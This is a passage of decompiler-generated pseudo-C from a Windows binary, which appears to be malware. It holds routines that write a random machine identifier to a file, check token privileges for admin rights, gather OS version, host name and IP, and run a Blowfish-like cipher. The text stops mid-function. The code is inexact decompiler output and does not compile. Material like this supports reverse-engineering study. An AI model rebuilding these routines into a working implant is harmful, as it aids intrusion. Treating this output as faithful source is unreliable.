//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <arpa/inet.h>
#include <netdb.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <windows.h>

// ---------------- Integer Types Definitions -----------------

typedef int64_t int128_t;

// ------------------------ Structures ------------------------

struct _FILETIME {
    int32_t e0;
    int32_t e1;
};

struct _OSVERSIONINFOW {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int16_t e5[128];
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _WIN32_FIND_DATAW {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8[1];
    int16_t e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct hostent {
    char * e0;
    char ** e1;
    int16_t e2;
    int16_t e3;
    char ** e4;
};

struct in_addr {
    int32_t e0;
};

// ------------------------- Classes --------------------------

// .?AVBitmap@Gdiplus@@ (base classes: .?AVImage@Gdiplus@@, .?AVGdiplusBase@Gdiplus@@)
// .?AVGdiplusBase@Gdiplus@@
// .?AVImage@Gdiplus@@
// .?AV_Generic_error_category@std@@
// .?AV_Iostream_error_category@std@@ (base classes: .?AVerror_category@std@@, .?AV_Generic_error_category@std@@)
// .?AVbad_alloc@std@@ (base classes: .?AVexception@std@@)
// .?AVbad_exception@std@@ (base classes: .?AVexception@std@@)
// .?AVerror_category@std@@
// .?AVexception@std@@
// .?AVlogic_error@std@@ (base classes: .?AVexception@std@@)
// .?AVout_of_range@std@@ (base classes: .?AVexception@std@@, .?AVlogic_error@std@@)
// .?AVtype_info@@

// ------------------- Function Prototypes --------------------

int32_t _40___security_check_cookie_40_4(void);
int32_t function_404420(char a1);
int32_t function_404450(int32_t result, int32_t a2);
int32_t function_404470(int32_t a1, int32_t a2);
int32_t function_4044b0(int32_t a1, int32_t a2);
int32_t function_4044e0(int32_t result, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_404550(void);
int32_t function_404560(int32_t result, int32_t a2);
int32_t function_4047e0(int32_t a1, uint32_t a2);
int32_t function_404980(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_404ae0(int32_t a1, int32_t a2);
int32_t function_404c70(char a1);
int32_t function_404ca0(void);
int32_t function_405dd0(void);
int32_t function_406040(void);
int32_t function_4060c0(void);
int32_t function_4062a0(void);
int32_t function_406400(void);
int32_t function_406470(int32_t a1);
int32_t function_4068d0(int32_t a1);
int32_t function_406d30(void);
int32_t function_406f10(void);
int32_t function_408cb0(void);
int32_t function_408f30(void);
int32_t function_408fb0(void);
int32_t function_4098f0(void);
int32_t function_409a30(void);
int32_t function_409af0(void);
int32_t function_409cf0(void);
int32_t function_409da0(void);
int32_t function_409fb0(int32_t a1, int32_t * a2, int32_t a3);
int32_t function_40a220(void);
int32_t function_40a4d0(void);
int32_t function_40a7a0(void);
int32_t function_40a7f0(int32_t a1);
int32_t function_40b2ce(void);
int32_t function_40d183(void);

// --------------------- Global Variables ---------------------

int32_t g1 = 0x404420; // 0x422584
int128_t g2; // 0x422f78
int128_t g3; // 0x422f88
int128_t g4; // 0x422f98
int32_t g5 = 46; // 0x425920
int32_t g6 = 0x404c70; // 0x425a2c
int128_t g7; // 0x425e60
int128_t g8; // 0x425e70
int128_t g9; // 0x425ec0
int128_t g10; // 0x425ed0
int128_t g11; // 0x425f00
int128_t g12; // 0x425f50
int128_t g13; // 0x425fb0
int128_t g14; // 0x425fd0
int128_t g15; // 0x425fe0
int128_t g16; // 0x426010
int128_t g17; // 0x426020
int128_t g18; // 0x4260a0
int128_t g19; // 0x4260b0
int128_t g20; // 0x4260d0
int128_t g21; // 0x426100
int32_t g22 = -0x44bf19b2; // 0x428000
int32_t g23 = 0; // 0x42bf0c
int32_t g24 = 0; // 0x42bf10
int32_t g25 = 0; // 0x42bf14
int32_t g26 = 0; // 0x42bf18
int32_t g27 = 0; // 0x42bf1c
int32_t g28 = 0; // 0x42bf20
int32_t g29 = 0; // 0x42bf24
int32_t g30 = 0; // 0x42bf28
int32_t g31 = 0; // 0x42bf54
int32_t g32;

// ------------------------ Functions -------------------------

// Address range: 0x404420 - 0x404442
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_404420(char a1) {
    // 0x404420
    int32_t result; // 0x404420
    int32_t * v1 = (int32_t *)result; // 0x40442a
    *v1 = (int32_t)&g1;
    if ((a1 & 1) != 0) {
        // 0x404432
        _free(v1);
    }
    // 0x40443b
    return result;
}

// Address range: 0x404450 - 0x404462
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_404450(int32_t result, int32_t a2) {
    // 0x404450
    *(int32_t *)result = a2;
    return result;
}

// Address range: 0x404470 - 0x4044a3
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_404470(int32_t a1, int32_t a2) {
    // 0x404470
    int32_t v1; // 0x404470
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x404485
    if (v2 != *(int32_t *)(a2 + 4)) {
        // 0x40449b
        int32_t v3; // 0x404470
        return v3 & -256;
    }
    // 0x40448d
    if (v2 != *(int32_t *)a2) {
        // 0x40449b
        return v2 & -256;
    }
    // 0x404493
    return v2 & -256 | 1;
}

// Address range: 0x4044b0 - 0x4044ce
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_4044b0(int32_t a1, int32_t a2) {
    // 0x4044b0
    int32_t v1; // 0x4044b0
    if (v1 != *(int32_t *)(a1 + 4)) {
        // 0x4044c8
        return a1 & -256;
    }
    int32_t v2 = *(int32_t *)a1; // 0x4044bb
    if (v2 != a2) {
        // 0x4044c8
        return v2 & -256;
    }
    // 0x4044c2
    return v2 & -256 | 1;
}

// Address range: 0x4044e0 - 0x404550
int32_t function_4044e0(int32_t result, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = _3f__Syserror_map_40_std_40__40_YAPBDH_40_Z(a2); // 0x4044ef
    int32_t v2 = v1 != 0 ? v1 : (int32_t)"unknown error"; // 0x404501
    *(int32_t *)(result + 20) = 15;
    *(int32_t *)(result + 16) = 0;
    *(char *)result = 0;
    int32_t v3 = v2; // 0x404518
    if (*(char *)v2 == 0) {
        // 0x40451a
        function_4047e0(v2, 0);
        return result;
    }
    v3++;
    while (*(char *)v3 != 0) {
        // 0x404534
        v3++;
    }
    // 0x40453b
    function_4047e0(v2, v3 - v2);
    return result;
}

// Address range: 0x404550 - 0x404556
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_404550(void) {
    // 0x404550
    return (int32_t)"iostream";
}

// Address range: 0x404560 - 0x4045af
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_404560(int32_t result, int32_t a2) {
    // 0x404560
    if (a2 != 1) {
        // 0x40459f
        int32_t v1; // 0x404560
        int32_t v2; // 0x404560
        function_4044e0(result, a2, v1, 0, v2);
        return result;
    }
    // 0x404577
    *(int32_t *)(result + 20) = 15;
    *(int32_t *)(result + 16) = 0;
    *(char *)result = 0;
    function_4047e0((int32_t)"iostream stream error", 21);
    return result;
}

// Address range: 0x4047e0 - 0x404980
int32_t function_4047e0(int32_t a1, uint32_t a2) {
    // 0x4047e0
    int32_t result3; // 0x4047e0
    int32_t result; // 0x4047e0
    if (a1 != 0) {
        // 0x4047ee
        result3 = *(int32_t *)(result + 20);
    }
    // 0x404845
    int32_t v1; // bp-16, 0x4047e0
    int32_t v2; // bp-24, 0x4047e0
    uint32_t v3; // 0x4047e0
    if (a2 != -1) {
        int32_t * v4 = (int32_t *)(result + 20); // 0x40484e
        uint32_t v5 = *v4; // 0x40484e
        int32_t * v6; // 0x4047e0
        int32_t v7; // 0x4047e0
        int32_t v8; // 0x4047e0
        int32_t * v9; // 0x4047e0
        int32_t result2; // 0x4047e0
        if (v5 >= a2) {
            int32_t * v10 = (int32_t *)(result + 16);
            v6 = v10;
            v7 = v5;
            v9 = &v1;
            v8 = result3;
            if (a2 == 0) {
                // 0x404872
                *v10 = a2;
                if (v5 < 16) {
                    // 0x404888
                    *(char *)result = 0;
                    return result;
                }
                // 0x40487a
                *(char *)result3 = 0;
                return result;
            }
        } else {
            int32_t * v11 = (int32_t *)(result + 16);
            v2 = a2;
            int32_t v12; // 0x4047e0
            int32_t v13; // 0x4047e0
            int32_t v14; // 0x4047e0
            function_404980(a2, *v11, v12, v3, v14, v13);
            if (a2 == 0) {
                // 0x4048c3
                return result2;
            }
            // 0x404855
            v6 = v11;
            v7 = *v4;
            v9 = &v2;
        }
        int32_t v15 = (int32_t)v9;
        *(int32_t *)(v15 - 4) = a2;
        *(int32_t *)(v15 - 8) = a1;
        *(int32_t *)(v15 - 12) = v7 < 16 ? result : v8;
        _memcpy2();
        *v6 = a2;
        if (*v4 >= 16) {
            // 0x4048ae
            *(char *)(v8 + a2) = 0;
            return result;
        }
        // 0x4048bd
        *(char *)(result + a2) = 0;
        // 0x4048c3
        return result2;
    }
    // 0x4048cc
    _3f__Xinvalid_argument_40_std_40__40_YAXPBD_40_Z("string too long");
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    int32_t v16; // bp-4, 0x4047e0
    v2 = &v16;
    int32_t * v17 = (int32_t *)(result3 + 16); // 0x4048ea
    uint32_t v18 = *v17; // 0x4048ea
    if (v18 < v1) {
        // 0x40496f
        ?_Xinvalid_argument@std@@YAXPBD@Z("invalid string position");
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        return __asm_int3();
    }
    if (v18 - v1 <= v3) {
        // 0x4048fc
        *v17 = v1;
        if (*(int32_t *)(result3 + 20) < 16) {
            // 0x404913
            *(char *)(v1 + result3) = 0;
            return result3;
        }
        // 0x404905
        *(char *)(*(int32_t *)result3 + v1) = 0;
        return result3;
    }
    // 0x40491f
    if (v3 == 0) {
        // 0x4048c3
        return result3;
    }
    int32_t * v19 = (int32_t *)(result3 + 20); // 0x404923
    uint32_t v20 = *v19; // 0x404923
    int32_t v21 = result3; // 0x404927
    if (v20 >= 16) {
        // 0x404929
        v21 = *(int32_t *)result3;
    }
    int32_t v22 = v18 - v3; // 0x40492f
    int32_t v23 = v22 - v1; // 0x404937
    int32_t v24 = v20; // 0x404939
    if (v23 != 0) {
        int32_t v25 = v21 + v1; // 0x404932
        _memcpy((int32_t *)v25, (int32_t *)(v25 + v3), v23);
        v24 = *v19;
    }
    // 0x404949
    *v17 = v22;
    if (v24 >= 16) {
        // 0x404953
        *(char *)(*(int32_t *)result3 + v22) = 0;
        return result3;
    }
    // 0x404961
    *(char *)(v22 + result3) = 0;
    // 0x4048c3
    return result3;
}

// Address range: 0x404980 - 0x404acd
int32_t function_404980(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404990
    __writefsdword(0, (int32_t)&v1);
    uint32_t v2 = a1 | 15; // 0x4049b5
    int32_t v3 = a1; // 0x4049bb
    int32_t v4; // 0x404980
    if (v2 < 0xfffffffe) {
        uint32_t v5 = *(int32_t *)(v4 + 20); // 0x4049c1
        uint32_t v6 = v5 / 2; // 0x4049cd
        v3 = v2;
        if (v6 > v2 / 3) {
            // 0x4049d5
            v3 = v5 > -2 - v6 ? -2 : v6 + v5;
        }
    }
    int32_t v7 = v3 + 1; // 0x4049e8
    int32_t result = 0; // 0x4049f9
    if (v7 != 0) {
        // 0x404a00
        result = _3f__3f_2_40_YAPAXI_40_Z(v7);
        if (result == 0) {
            // 0x404a10
            _3f__Internal_throw_exception_40__Concurrent_queue_base_v4_40_details_40_Concurrency_40__40_IBEXXZ();
            function_404ae0(a1 + 1, (int32_t)&g32);
            return 0x404a35;
        }
    }
    int32_t * v8 = (int32_t *)(v4 + 20);
    int32_t v9 = v7; // 0x404a46
    if (a2 != 0) {
        // 0x404a48
        v9 = *v8 < 16 ? v4 : v7;
        _memcpy2();
    }
    // 0x404a90
    if (*v8 >= 16) {
        // 0x404a96
        _free((int32_t *)v9);
    }
    // 0x404aa0
    *(char *)v4 = 0;
    *(int32_t *)v4 = result;
    *v8 = v3;
    *(int32_t *)(v4 + 16) = a2;
    *(char *)((v3 < 16 ? v4 : result) + a2) = 0;
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x404ae0 - 0x404c68
int32_t function_404ae0(int32_t a1, int32_t a2) {
    // 0x404ae0
    if (a2 == 0) {
        // 0x404b00
        return 0;
    }
    int32_t result = _3f__3f_2_40_YAPAXI_40_Z(a2); // 0x404af2
    if (result != 0) {
        // 0x404b00
        return result;
    }
    // 0x404b06
    _3f__Internal_throw_exception_40__Concurrent_queue_base_v4_40_details_40_Concurrency_40__40_IBEXXZ();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    if (a1 != 0) {
        // 0x404b4a
        *(int32_t *)a1 = 0;
    }
    int32_t v1 = _rand(); // 0x404b50
    int32_t v2; // 0x404ae0
    int32_t v3 = v2 + 16 & -16; // 0x404b63
    int32_t * v4 = _malloc((v3 | 1) + (int32_t)((0x100000000 * (int64_t)(v1 >> 31) | (int64_t)v1) % 15)); // 0x404b79
    if (v4 == NULL) {
        // 0x404b8d
        return _40___security_check_cookie_40_4();
    }
    // 0x404b9e
    _memset(v4, v3 - v2, v3);
    _memcpy2();
    // UNREACHABLE
}

// Address range: 0x404c70 - 0x404c99
// From class:    .?AVBitmap@Gdiplus@@
// Type:          virtual member function
int32_t function_404c70(char a1) {
    // 0x404c70
    int32_t result; // 0x404c70
    int32_t * v1 = (int32_t *)result; // 0x404c79
    *v1 = (int32_t)&g6;
    GdipDisposeImage((int32_t *)*(int32_t *)(result + 4));
    if ((a1 & 1) != 0) {
        // 0x404c8b
        GdipFree(v1);
    }
    // 0x404c92
    return result;
}

// Address range: 0x404ca0 - 0x404cec
// From class:    .?AVBitmap@Gdiplus@@
// Type:          virtual member function
int32_t function_404ca0(void) {
    int32_t v1 = 0; // bp-8, 0x404ca7
    int32_t v2; // 0x404ca0
    int32_t v3 = GdipCloneImage((int32_t *)*(int32_t *)(v2 + 4), (int32_t **)&v1); // 0x404cb5
    if (v3 != 0) {
        // 0x404cbf
        *(int32_t *)(v2 + 8) = v3;
    }
    int32_t * v4 = GdipAlloc(16); // 0x404cc4
    if (v4 == NULL) {
        // 0x404ce5
        return 0;
    }
    int32_t result = (int32_t)v4; // 0x404cc4
    *v4 = (int32_t)&g6;
    *(int32_t *)(result + 4) = v1;
    *(int32_t *)(result + 8) = *(int32_t *)(v2 + 8);
    return result;
}

// Address range: 0x405dd0 - 0x406035
int32_t function_405dd0(void) {
    char lpBuffer = 0; // bp-164, 0x405ded
    int32_t v1; // bp-163, 0x405dd0
    _memset(&v1, 0, 44);
    int32_t v2; // bp-115, 0x405dd0
    _memset(&v2, 0, 99);
    char lpFileName = 0; // bp-216, 0x405e11
    int32_t v3; // bp-215, 0x405dd0
    _memset(&v3, 0, 49);
    int32_t v4 = 0x35545039; // bp-116, 0x405e23
    int32_t v5 = &v4; // 0x405e4d
    int32_t v6 = v5; // 0x405e50
    while (*(char *)v6 != 0) {
        // 0x405e52
        v6++;
    }
    // 0x405e59
    int32_t v7; // bp-217, 0x405dd0
    int32_t v8 = &v7; // 0x405e61
    v8++;
    char * v9 = (char *)v8;
    while (*v9 != 0) {
        // 0x405e62
        v8++;
        v9 = (char *)v8;
    }
    uint32_t v10 = v6 - v5; // 0x405e5f
    uint32_t v11 = v10 / 4; // 0x405e72
    __asm_rep_movsd_memcpy(v9, (char *)&v4, v11);
    bool v12; // 0x405dd0
    int32_t v13 = v12 ? -4 : 4; // 0x405e75
    char * v14 = (char *)(v8 + v11 * v13); // 0x405e8e
    __asm_rep_movsb_memcpy(v14, v14, v10 & 3);
    int32_t * fileHandle = CreateFileA(&lpFileName, (int32_t)&g32, (int32_t)&g32, (struct _SECURITY_ATTRIBUTES *)&g32, (int32_t)&g32, (int32_t)&g32, &g32); // 0x405e97
    int32_t lpNumberOfBytesRead; // bp-344, 0x405dd0
    if (fileHandle != (int32_t *)-1) {
        // 0x405fff
        ReadFile(fileHandle, (int32_t *)&lpBuffer, 40, &lpNumberOfBytesRead, NULL);
        CloseHandle(fileHandle);
        return _40___security_check_cookie_40_4();
    }
    int32_t * fileHandle2 = CreateFileA(&lpFileName, 4, 1, NULL, 2, 128, NULL); // 0x405ebb
    int32_t v15; // bp-67, 0x405dd0
    _memset(&v15, 0, 49);
    int128_t v16; // 0x405dd0
    __asm_movdqu_10(v16, __asm_movdqa(g19));
    GetModuleHandleA("Advapi32.dll");
    function_406f10();
    int32_t v17; // bp-336, 0x405dd0
    int32_t v18 = &v17; // 0x405f1b
    while (*(char *)v18 != 0) {
        // 0x405f20
        v18++;
    }
    // 0x405f27
    int32_t v19; // bp-335, 0x405dd0
    int32_t v20 = v18 - (int32_t)&v19; // 0x405f27
    if (v20 != 0) {
        int32_t v21 = 0;
        int32_t v22; // bp-4, 0x405dd0
        int32_t v23; // 0x405dd0
        if (v21 != 0 && v21 != v20 - 1) {
            // 0x405f3b
            v23 = v21 + (int32_t)&v22;
            *(char *)(v23 - 161) = *(char *)(v23 - 332);
        }
        int32_t v24 = v21 + 1; // 0x405f49
        while (v24 != v20) {
            // 0x405f30
            v21 = v24;
            if (v21 != 0 && v21 != v20 - 1) {
                // 0x405f3b
                v23 = v21 + (int32_t)&v22;
                *(char *)(v23 - 161) = *(char *)(v23 - 332);
            }
            // 0x405f49
            v24 = v21 + 1;
        }
    }
    // 0x405f4e
    _srand(GetTickCount());
    int32_t v25 = _rand(); // 0x405f5a
    int32_t v26 = 0; // bp-16, 0x405f6c
    __itoa((int32_t)((0x100000000 * (int64_t)(v25 >> 31) | (int64_t)v25) % 0xc350) + 0x2710, (char *)&v26, 16);
    int32_t v27 = &v26; // 0x405f84
    int32_t v28 = v27; // 0x405f8c
    while (*(char *)v28 != 0) {
        // 0x405f90
        v28++;
    }
    // 0x405f97
    int32_t v29; // bp-165, 0x405dd0
    int32_t v30 = &v29; // 0x405f9f
    v30++;
    char * v31 = (char *)v30;
    while (*v31 != 0) {
        // 0x405fa0
        v30++;
        v31 = (char *)v30;
    }
    uint32_t v32 = v28 - v27; // 0x405f9d
    uint32_t v33 = v32 / 4; // 0x405faa
    __asm_rep_movsd_memcpy(v31, (char *)&v26, v33);
    char * v34 = (char *)(v30 + v33 * v13); // 0x405fb4
    __asm_rep_movsb_memcpy(v34, v34, v32 & 3);
    int32_t v35 = &lpBuffer; // 0x405fbf
    while (*(char *)v35 != 0) {
        // 0x405fc0
        v35++;
    }
    // 0x405fc7
    WriteFile(fileHandle2, (int32_t *)&lpBuffer, v35 - (int32_t)&v1, &lpNumberOfBytesRead, NULL);
    CloseHandle(fileHandle2);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x406040 - 0x4060bd
int32_t function_406040(void) {
    // 0x406040
    int128_t v1; // 0x406040
    int128_t v2; // 0x406040
    __asm_movdqu_10(v2, __asm_xorps(v1, v1));
    GetModuleHandleA(NULL);
    __asm_movdqu_10(0, __asm_movdqa(g14));
    function_406f10();
    return _40___security_check_cookie_40_4();
}

// Address range: 0x4060c0 - 0x406293
int32_t function_4060c0(void) {
    // 0x4060c0
    int32_t v1; // bp-227, 0x4060c0
    _memset(&v1, 0, 199);
    int128_t v2; // 0x4060c0
    int128_t v3; // 0x4060c0
    __asm_movdqu_10(v3, __asm_xorps(v2, v2));
    function_406f10();
    OpenProcess(0x1fffff, false, GetCurrentProcessId());
    GetModuleHandleA("Advapi32.dll");
    __asm_movdqu_10(71, __asm_movdqa(0x6e656b6f54737365636f72506e65704f));
    function_406f10();
    __asm_movdqu_10(71, __asm_movdqa(0x74616d726f666e496e656b6f54746547));
    function_406f10();
    int32_t v4; // 0x4060c0
    if (v4 != 0) {
        // 0x4061eb
        _printf("ok");
    }
    // 0x4061f8
    LoadLibraryW(L"shell32.dll");
    GetModuleHandleW(L"shell32.dll");
    int32_t v5; // bp-229, 0x4060c0
    if (function_406f10() == 0) {
        int32_t v6 = &v5; // 0x406274
        while (*(char *)(v6 + 1) != 0) {
            // 0x406275
            v6++;
        }
        // 0x40627f
        return _40___security_check_cookie_40_4();
    }
    // 0x406239
    _printf("user is admin");
    int32_t v7 = &v5; // 0x40624d
    while (*(char *)(v7 + 1) != 0) {
        // 0x406250
        v7++;
    }
    // 0x40625a
    return _40___security_check_cookie_40_4();
}

// Address range: 0x4062a0 - 0x4063f9
int32_t function_4062a0(void) {
    // 0x4062a0
    int128_t v1; // 0x4062a0
    int128_t v2 = __asm_xorps(v1, v1); // 0x4062c6
    int128_t v3; // 0x4062a0
    __asm_movdqu_10(v3, v2);
    int32_t * v4 = NULL; // bp-16, 0x4062d5
    _memset(NULL, 0, (int32_t)&g32);
    int32_t lpVersionInformation = 276; // bp-332, 0x4062e8
    int128_t v5; // 0x4062a0
    __asm_movdqu_10(v5, __asm_xorps(v2, v2));
    int32_t * moduleHandle = GetModuleHandleA("kernel32.dll"); // 0x40630d
    char lpProcName = 71; // bp-36, 0x406316
    GetProcAddress(moduleHandle, &lpProcName);
    GetVersionExW((struct _OSVERSIONINFOW *)&lpVersionInformation);
    int32_t v6; // 0x4062a0
    __itoa(v6, (char *)&v4, 10);
    int32_t v7 = (int32_t)&v4; // 0x40635c
    int32_t v8 = v7; // 0x406362
    while (*(char *)v8 != 0) {
        // 0x406364
        v8++;
    }
    // 0x40636b
    int32_t v9; // bp-57, 0x4062a0
    int32_t v10 = &v9; // 0x406370
    int32_t v11 = v10; // 0x406370
    v11++;
    char * v12 = (char *)v11;
    while (*v12 != 0) {
        // 0x406371
        v11++;
        v12 = (char *)v11;
    }
    uint32_t v13 = v8 - v7; // 0x40636e
    uint32_t v14 = v13 / 4; // 0x40637b
    __asm_rep_movsd_memcpy(v12, (char *)&v4, v14);
    bool v15; // 0x4062a0
    int32_t v16 = v15 ? -4 : 4; // 0x40637e
    char * v17 = (char *)(v11 + v14 * v16); // 0x406385
    __asm_rep_movsb_memcpy(v17, v17, v13 & 3);
    int32_t v18 = v10; // 0x40638b
    v18++;
    while (*(char *)v18 != 0) {
        // 0x406390
        v18++;
    }
    // 0x40639a
    *(int32_t *)v18 = 0x76696d;
    int32_t v19; // 0x4062a0
    __itoa(v19, (char *)&v4, 10);
    int32_t v20 = v7;
    int32_t v21 = v20 + 1; // 0x4063c2
    while (*(char *)v20 != 0) {
        // 0x4063c0
        v20 = v21;
        v21 = v20 + 1;
    }
    int32_t v22 = v10 + 1; // 0x4063d0
    char * v23 = (char *)v22;
    int32_t v24 = v22; // 0x4063d6
    while (*v23 != 0) {
        // 0x4063d0
        v22 = v24 + 1;
        v23 = (char *)v22;
        v24 = v22;
    }
    uint32_t v25 = v21 - v7; // 0x4063ca
    uint32_t v26 = v25 / 4; // 0x4063dd
    __asm_rep_movsd_memcpy(v23, (char *)&v4, v26);
    char * v27 = (char *)(v22 + v26 * v16); // 0x4063e7
    __asm_rep_movsb_memcpy(v27, v27, v25 & 3);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x406400 - 0x406461
int32_t function_406400(void) {
    struct in_addr in; // 0x40644d
    // 0x406400
    int32_t name; // bp-88, 0x406400
    if (gethostname((char *)&name, 80) == -1) {
        // 0x406421
        return _40___security_check_cookie_40_4();
    }
    struct hostent * v1 = gethostbyname((char *)&name); // 0x406438
    if (v1 == NULL) {
        // 0x406421
        return _40___security_check_cookie_40_4();
    }
    int32_t v2 = *(int32_t *)*(int32_t *)((int32_t)v1 + 12); // 0x406445
    if (v2 != 0) {
        // 0x40644b
        in = (struct {int32_t e0;}){
            .e0 = 0
        };
        in.e0 = *(int32_t *)v2;
        inet_ntoa(in);
    }
    // 0x406453
    return _40___security_check_cookie_40_4();
}

// Address range: 0x406470 - 0x4068d0
int32_t function_406470(int32_t a1) {
    // 0x406470
    int32_t v1; // 0x406470
    unsigned char v2 = *(char *)(v1 + 1); // 0x406482
    unsigned char v3 = *(char *)(v1 + 2); // 0x40648b
    unsigned char v4 = *(char *)(v1 + 3); // 0x406494
    int32_t v5 = *(int32_t *)a1; // 0x40649d
    uint32_t v6 = (256 * (256 * (256 * v1 & 0xff00 | (int32_t)v2) | (int32_t)v3) | (int32_t)v4) ^ v5; // 0x40649d
    int32_t v7 = a1 + 1096; // 0x4064af
    int32_t v8 = *(int32_t *)((v6 / 0x4000 & 1020) + v7); // 0x4064af
    int32_t v9 = a1 + 72; // 0x4064b6
    int32_t v10 = *(int32_t *)(4 * v6 / 0x1000000 + v9); // 0x4064b6
    unsigned char v11 = *(char *)(v1 + 4); // 0x4064bc
    int32_t v12 = a1 + 2120; // 0x4064cb
    int32_t v13 = *(int32_t *)((v6 / 64 & 1020) + v12); // 0x4064cb
    int32_t v14 = a1 + 3144; // 0x4064d5
    int32_t v15 = *(int32_t *)((4 * v6 & 1020) + v14); // 0x4064d5
    unsigned char v16 = *(char *)(v1 + 5); // 0x4064dc
    unsigned char v17 = *(char *)(v1 + 6); // 0x4064e2
    unsigned char v18 = *(char *)(v1 + 7); // 0x4064eb
    int32_t v19 = *(int32_t *)(a1 + 4); // 0x4064f6
    uint32_t v20 = v19 ^ (v13 ^ v10 + v8) + v15 ^ (256 * (256 * (256 * (int32_t)v11 | (int32_t)v16) | (int32_t)v17) | (int32_t)v18); // 0x4064f6
    int32_t v21 = *(int32_t *)(4 * v20 / 0x1000000 + v9); // 0x406510
    int32_t v22 = *(int32_t *)((v20 / 64 & 1020) + v12); // 0x40651e
    int32_t v23 = *(int32_t *)((4 * v20 & 1020) + v14); // 0x406528
    int32_t v24 = *(int32_t *)(a1 + 8); // 0x406531
    uint32_t v25 = (v21 + *(int32_t *)((v20 / 0x4000 & 1020) + v7) ^ v22) + v23 ^ v6 ^ v24; // 0x406534
    int32_t v26 = *(int32_t *)(4 * v25 / 0x1000000 + v9); // 0x40654d
    int32_t v27 = *(int32_t *)((v25 / 64 & 1020) + v12); // 0x40655b
    int32_t v28 = *(int32_t *)((4 * v25 & 1020) + v14); // 0x406565
    int32_t v29 = *(int32_t *)(a1 + 12); // 0x40656e
    uint32_t v30 = (v26 + *(int32_t *)((v25 / 0x4000 & 1020) + v7) ^ v27) + v28 ^ v20 ^ v29; // 0x406571
    int32_t v31 = *(int32_t *)(4 * v30 / 0x1000000 + v9); // 0x40658a
    int32_t v32 = *(int32_t *)((v30 / 64 & 1020) + v12); // 0x406598
    int32_t v33 = *(int32_t *)((4 * v30 & 1020) + v14); // 0x4065a2
    int32_t v34 = *(int32_t *)(a1 + 16); // 0x4065ab
    uint32_t v35 = (v31 + *(int32_t *)((v30 / 0x4000 & 1020) + v7) ^ v32) + v33 ^ v25 ^ v34; // 0x4065ae
    int32_t v36 = *(int32_t *)(4 * v35 / 0x1000000 + v9); // 0x4065c7
    int32_t v37 = *(int32_t *)((v35 / 64 & 1020) + v12); // 0x4065d5
    int32_t v38 = *(int32_t *)((4 * v35 & 1020) + v14); // 0x4065df
    int32_t v39 = *(int32_t *)(a1 + 20); // 0x4065e8
    uint32_t v40 = (v36 + *(int32_t *)((v35 / 0x4000 & 1020) + v7) ^ v37) + v38 ^ v30 ^ v39; // 0x4065eb
    int32_t v41 = *(int32_t *)(4 * v40 / 0x1000000 + v9); // 0x406604
    int32_t v42 = *(int32_t *)((v40 / 64 & 1020) + v12); // 0x406612
    int32_t v43 = *(int32_t *)((4 * v40 & 1020) + v14); // 0x40661c
    int32_t v44 = *(int32_t *)(a1 + 24); // 0x406625
    uint32_t v45 = (v41 + *(int32_t *)((v40 / 0x4000 & 1020) + v7) ^ v42) + v43 ^ v35 ^ v44; // 0x406628
    int32_t v46 = *(int32_t *)(4 * v45 / 0x1000000 + v9); // 0x406641
    int32_t v47 = *(int32_t *)((v45 / 64 & 1020) + v12); // 0x40664f
    int32_t v48 = *(int32_t *)((4 * v45 & 1020) + v14); // 0x406659
    int32_t v49 = *(int32_t *)(a1 + 28); // 0x406662
    uint32_t v50 = (v46 + *(int32_t *)((v45 / 0x4000 & 1020) + v7) ^ v47) + v48 ^ v40 ^ v49; // 0x406665
    int32_t v51 = *(int32_t *)(4 * v50 / 0x1000000 + v9); // 0x40667e
    int32_t v52 = *(int32_t *)((v50 / 64 & 1020) + v12); // 0x40668c
    int32_t v53 = *(int32_t *)((4 * v50 & 1020) + v14); // 0x406696
    int32_t v54 = *(int32_t *)(a1 + 32); // 0x40669f
    uint32_t v55 = (v51 + *(int32_t *)((v50 / 0x4000 & 1020) + v7) ^ v52) + v53 ^ v45 ^ v54; // 0x4066a2
    int32_t v56 = *(int32_t *)(4 * v55 / 0x1000000 + v9); // 0x4066bb
    int32_t v57 = *(int32_t *)((v55 / 64 & 1020) + v12); // 0x4066c9
    int32_t v58 = *(int32_t *)((4 * v55 & 1020) + v14); // 0x4066d3
    int32_t v59 = *(int32_t *)(a1 + 36); // 0x4066dc
    uint32_t v60 = (v56 + *(int32_t *)((v55 / 0x4000 & 1020) + v7) ^ v57) + v58 ^ v50 ^ v59; // 0x4066df
    int32_t v61 = *(int32_t *)(4 * v60 / 0x1000000 + v9); // 0x4066f8
    int32_t v62 = *(int32_t *)((v60 / 64 & 1020) + v12); // 0x406706
